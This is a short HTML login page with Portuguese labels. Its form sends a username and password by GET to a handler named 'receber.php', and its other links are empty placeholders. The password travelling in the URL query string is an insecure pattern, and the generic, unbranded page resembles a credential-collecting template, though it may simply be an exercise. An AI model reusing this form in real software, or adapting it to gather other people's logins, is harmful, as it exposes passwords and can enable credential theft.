

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>
<style>
body {
font-family: Arial, sans-serif;
background: linear-gradient(120deg, #2980b9, #6dd5fa);
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
}
form {
display:flex;
flex-direction: column;
justify-content: center;
align-items: center;
background: #fff;
padding: 25px;
border-radius: 8px;
box-shadow: 0 4px 10px rgba(0,0,0,0.2);
width: 300px;
}
h2 {
text-align: center;
margin-bottom: 20px;
}
input[type=text], input[type=password] {
width: 90%;
padding: 10px;
margin: 8px 0;
border: 1px solid #ccc;
border-radius: 4px;
}
button {
width: 50%;
padding: 10px;
background-color: #2980b9;
color: white;
border: none;
border-radius: 4px;
cursor: pointer;
}
button:hover {
background-color: #1f6391;
}
.links {
text-align: center;
margin-top: 10px;
}
</style>
</head>
<body>

<form action="receber.php" method="get">
<h2>Login</h2>
<input type="text" name="user" placeholder="Username ou Email" required>

<input type="password" name="pass" placeholder="Senha" required>

<button type="submit">Login</button>

<div class="links">

<a href="#">Esqueceu a senha ?</a> | <a href="#">Registrar</a>

</div>

</form>

</body>
</html>